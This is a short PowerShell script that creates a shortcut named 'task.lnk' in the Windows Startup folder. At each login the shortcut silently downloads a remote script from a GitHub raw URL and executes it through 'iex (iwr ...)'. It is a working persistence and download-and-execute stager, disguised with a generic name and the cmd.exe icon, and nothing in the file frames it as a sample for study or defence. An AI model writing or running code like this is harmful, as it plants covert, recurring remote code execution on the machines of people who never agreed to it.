$command = 'powershell -Command "iex (iwr "https://raw.githubusercontent.com/guilegel4/server/refs/heads/main/pi.ps1")"'
$shortcutName = "task.lnk"
$startupFolder = [System.Environment]::GetFolderPath('Startup')
$shortcutPath = Join-Path $startupFolder $shortcutName
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = "cmd.exe"
$shortcut.Arguments = "/c $command"  # /c runs the command and closes the cmd window
$shortcut.IconLocation = "cmd.exe"   # Optional: use cmd.exe icon
$shortcut.Save()
